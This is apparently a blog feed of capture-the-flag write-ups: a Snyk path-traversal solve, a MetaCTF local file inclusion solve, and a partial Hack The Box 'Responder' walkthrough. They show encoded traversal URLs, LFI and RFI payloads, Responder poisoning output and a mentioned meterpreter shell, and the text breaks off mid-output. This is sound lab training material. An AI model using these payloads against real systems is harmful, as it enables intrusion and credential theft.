<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/    
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;bin/&#34;</span>&gt;bin/&lt;/a&gt;         2019-05-08T01:41:31.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;boot/&#34;</span>&gt;boot/&lt;/a&gt;        2019-03-28T09:12:44.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;dev/&#34;</span>&gt;dev/&lt;/a&gt;         2022-11-09T11:51:50.758Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;etc/&#34;</span>&gt;etc/&lt;/a&gt;         2022-11-09T11:51:47.531Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;home/&#34;</span>&gt;home/&lt;/a&gt;        2019-05-08T02:14:27.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;lib/&#34;</span>&gt;lib/&lt;/a&gt;         2019-05-08T01:41:44.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;lib64/&#34;</span>&gt;lib64/&lt;/a&gt;       2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;media/&#34;</span>&gt;media/&lt;/a&gt;       2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;mnt/&#34;</span>&gt;mnt/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;opt/&#34;</span>&gt;opt/&lt;/a&gt;         2019-05-08T02:17:53.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;proc/&#34;</span>&gt;proc/&lt;/a&gt;        2022-11-09T11:51:50.747Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;root/&#34;</span>&gt;root/&lt;/a&gt;        2022-09-22T07:15:14.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;run/&#34;</span>&gt;run/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;sbin/&#34;</span>&gt;sbin/&lt;/a&gt;        2019-05-08T01:40:28.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;srv/&#34;</span>&gt;srv/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;sys/&#34;</span>&gt;sys/&lt;/a&gt;         2022-11-09T11:48:47.826Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;tmp/&#34;</span>&gt;tmp/&lt;/a&gt;         2022-09-22T07:15:14.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;usr/&#34;</span>&gt;usr/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;var/&#34;</span>&gt;var/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>After searching for a  while I found the source code of the program and found the flag.</p>
<p>It turns out that the source code for the program is located in <code>/usr/src/goof</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/  
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;goof/&#34;</span>&gt;goof/&lt;/a&gt;       2022-09-22T07:15:25.000Z       -
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let’s see what is inside that folder:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/goof/
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;node_modules/&#34;</span>&gt;node_modules/&lt;/a&gt;            2022-09-22T07:15:28.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;public/&#34;</span>&gt;public/&lt;/a&gt;                  2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;routes/&#34;</span>&gt;routes/&lt;/a&gt;                  2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;views/&#34;</span>&gt;views/&lt;/a&gt;                   2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;app.js&#34;</span>&gt;app.js&lt;/a&gt;                   2022-09-22T07:13:46.000Z         <span class="m">502</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;app.json&#34;</span>&gt;app.json&lt;/a&gt;                 2022-09-22T07:13:46.000Z         <span class="m">267</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;build-tag-push.sh&#34;</span>&gt;build-tag-push.sh&lt;/a&gt;        2022-09-22T07:13:46.000Z         <span class="m">206</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;challenge.yml&#34;</span>&gt;challenge.yml&lt;/a&gt;            2022-09-22T07:13:46.000Z        <span class="m">1261</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;docker-compose.yml&#34;</span>&gt;docker-compose.yml&lt;/a&gt;       2022-09-22T07:13:46.000Z         <span class="m">155</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;Dockerfile&#34;</span>&gt;Dockerfile&lt;/a&gt;               2022-09-22T07:13:46.000Z         <span class="m">203</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span>&gt;flag&lt;/a&gt;                     2022-09-22T07:13:46.000Z          <span class="m">72</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;index.html&#34;</span>&gt;index.html&lt;/a&gt;               2022-09-22T07:13:46.000Z         <span class="m">182</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;package-lock.json&#34;</span>&gt;package-lock.json&lt;/a&gt;        2022-09-22T07:13:46.000Z       <span class="m">34853</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;package.json&#34;</span>&gt;package.json&lt;/a&gt;             2022-09-22T07:13:46.000Z         <span class="m">518</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;README.md&#34;</span>&gt;README.md&lt;/a&gt;                2022-09-22T07:13:46.000Z          <span class="m">28</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;test.py&#34;</span>&gt;test.py&lt;/a&gt;                  2022-09-22T07:13:46.000Z         <span class="m">603</span>
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is the flag!</p>
<p>It’s located in <code>/usr/src/goof/flag</code></p>
<p>Let’s retrieve the flag using curl</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/goof/flag
</span></span><span class="line"><span class="cl">SNYK<span class="o">{</span>6854ecb17f23afdf2610f741dd07bd6099c616e4ac2a403eb14fa8689e1fb0af<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>found the flag:</p>
<p><code>SNYK{6854ecb17f23afdf2610f741dd07bd6099c616e4ac2a403eb14fa8689e1fb0af}</code></p>
]]></description></item><item><title>Technovate2022 - Forensics - Trail Blazer</title><link>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</link><pubDate>Sun, 04 Dec 2022 23:39:42 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/technovate2022.jpg" referrerpolicy="no-referrer">
            </div><h1 id="trail-blazer">Trail Blazer</h1>
<h2 id="description">description</h2>
<p>I just made <a href="http://host3.metaproblems.com:4110/" target="_blank" rel="noopener noreffer">this cool website</a> that acts as your own personal web browser!</p>
<p>Why is this cool? Well&hellip; I wrote it! Anyway, check it out and let me know if there are any
features you would like to see added!</p>
<p><strong>Hint: You just need to search for /flag.txt.</strong></p>
<h2 id="writeup">writeup</h2>
<p>upon opening the website in my browser i am presented with the following form:</p>
<p></p>
<p>If i try to input any url e.g. <a href="http://google.com" target="_blank" rel="noopener noreffer">google.com</a> I get redirected to this page: <a href="http://host3.metaproblems.com:4110/blaze.php?page=google.com" target="_blank" rel="noopener noreffer"><code>http://host3.metaproblems.com:4110/blaze.php?page=google.com</code></a></p>
<p>But I get an error:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Could not open file.
</span></span></code></pre></td></tr></table>
</div>
</div><p>So it looks like the program is including an actual single file.</p>
<p>Let’s try something like: <code>/proc/version</code></p>
<p>The GET request would look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page=/proc/version
</span></span></code></pre></td></tr></table>
</div>
</div><p>And I get the following response:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Linux version 4.19.0-22-cloud-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.260-1 (2022-09-29)
</span></span></code></pre></td></tr></table>
</div>
</div><p>So that confirms that the LFI technique is in fact working.</p>
<p>Since the hint for this challenge says: <strong>You just need to search for /flag.txt</strong></p>
<p>We can just get the flag like so:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page<span class="o">=</span>/flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MetaCTF<span class="o">{</span>blazing_paths_will_blaze_your_app_t00<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>HTB - Starting Point - Responder</title><link>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</link><pubDate>Tue, 13 Sep 2022 19:31:57 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/responder.jpeg" referrerpolicy="no-referrer">
            </div><h1 id="htb---starting-point-responder---writeup">HTB - Starting Point: Responder - writeup:</h1>
<h2 id="target-ip-address">Target IP Address:</h2>
<p><strong>10.129.17.20</strong></p>
<p><code>export IP=&quot;10.129.17.20&quot;</code></p>
<h1 id="tasks">Tasks</h1>
<h2 id="task1-when-visiting-the-web-service-using-the-ip-address-what-is-the-domain-that-we-are-being-redirected-to">Task1: When visiting the web service using the IP address, what is the domain that we are being redirected to?</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="nv">$IP</span>          
</span></span><span class="line"><span class="cl">&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;0;url=http://unika.htb/&#34;</span>&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>A: unika.htb</strong></p>
<!-- raw HTML omitted -->
<h2 id="task2-which-scripting-language-is-being-used-on-the-server-to-generate-webpages">Task2: Which scripting language is being used on the server to generate webpages?</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nikto -h http://<span class="nv">$IP</span>      
</span></span><span class="line"><span class="cl">perl: warning: Setting locale failed.
</span></span><span class="line"><span class="cl">perl: warning: Please check that your locale settings:
</span></span><span class="line"><span class="cl">        <span class="nv">LANGUAGE</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="nv">LC_ALL</span> <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
</span></span><span class="line"><span class="cl">        <span class="nv">LANG</span> <span class="o">=</span> <span class="s2">&#34;de_DE.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl">    are supported and installed on your system.
</span></span><span class="line"><span class="cl">perl: warning: Falling back to the standard locale <span class="o">(</span><span class="s2">&#34;C&#34;</span><span class="o">)</span>.
</span></span><span class="line"><span class="cl">- Nikto v2.1.6
</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">+ Target IP:          10.129.128.80
</span></span><span class="line"><span class="cl">+ Target Hostname:    10.129.128.80
</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">80</span>
</span></span><span class="line"><span class="cl">+ Start Time:         2022-09-13 15:56:59 <span class="o">(</span>GMT2<span class="o">)</span>
</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.52 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1
</span></span><span class="line"><span class="cl">+ Retrieved x-powered-by header: PHP/8.1.1
</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>A: PHP</strong></p>
<!-- raw HTML omitted -->
<h2 id="task3-what-is-the-name-of-the-url-parameter-which-is-used-to-load-different-language-versions-of-the-webpage">Task3: What is the name of the URL parameter which is used to load different language versions of the webpage?</h2>
<p><strong>A: page</strong></p>
<!-- raw HTML omitted -->
<h2 id="task4-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-local-file-include-lfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task4: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
<p>I was able to exploit LFI like so:</p>
<p><code>http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
<p><strong>A: <a href="http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts" target="_blank" rel="noopener noreffer">http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</a></strong></p>
<!-- raw HTML omitted -->
<h2 id="task5-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-remote-file-include-rfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task5: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
<p><strong>A: //10.10.14.6/somefile</strong></p>
<!-- raw HTML omitted -->
<h2 id="task6-what-does-ntlm-stand-for">Task6: What does NTLM stand for?</h2>
<p><strong>A: New Technology LAN Manager</strong></p>
<!-- raw HTML omitted -->
<h2 id="task7-which-flag-do-we-use-in-the-responder-utility-to-specify-the-network-interface">Task7: Which flag do we use in the Responder utility to specify the network interface?</h2>
<p><strong>A: -I</strong></p>
<!-- raw HTML omitted -->
<h2 id="task8-there-are-several-tools-that-take-a-netntlmv2-challengeresponse-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-one-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what">Task8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</h2>
<p><strong>A: John the Ripper</strong></p>
<!-- raw HTML omitted -->
<h2 id="task9-what-is-the-password-for-the-administrator-user">Task9: What is the password for the administrator user?</h2>
<p>For this task we will need the tool <code>responder</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/lgandx/Responder 
</span></span></code></pre></td></tr></table>
</div>
</div><p>I was able to run responder and capture hashes by using RFI to sideload a php meterpreter file and ultimately gaining a shell.</p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> Responder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo responder -i 10.10.16.156 -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.3.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  To support this project:
</span></span><span class="line"><span class="cl">  Patreon -&gt; https://www.patreon.com/PythonResponder
</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
